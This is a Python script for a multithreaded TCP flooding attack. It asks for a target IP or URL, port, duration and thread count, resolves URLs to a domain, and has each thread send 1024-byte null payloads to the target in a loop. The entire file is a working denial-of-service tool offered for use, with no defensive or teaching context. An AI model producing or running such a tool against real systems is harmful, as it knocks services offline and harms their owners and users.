import socket
import threading
import time
import requests

def resolve_url(url):
    try:
        response = requests.get(url)
        return response.url
    except requests.exceptions.RequestException as e:
        print(f"Error resolving URL: {e}")
        return None

def attack(target, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        payload = b"\x00" * 1024  # You can customize the payload
        start_time = time.time()
        while time.time() - start_time < duration:
            client.send(payload)
        client.close()
    except Exception as e:
        print(f"Error: {e}")

def main():
    target = input("Enter the target (IP or URL): ")
    port = int(input("Enter the target port: "))
    duration = int(input("Enter the duration of the attack (in seconds): "))
    threads = int(input("Enter the number of threads: "))

    if 'http' in target or 'www.' in target:
        resolved_url = resolve_url(target)
        if resolved_url:
            target = resolved_url.split('/')[2]  # Extract the domain name
            print(f"Resolved target: {target}")
        else:
            print("Failed to resolve URL. Exiting.")
            return

    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(target, port, duration))
        thread.start()

if __name__ == "__main__":
    main()
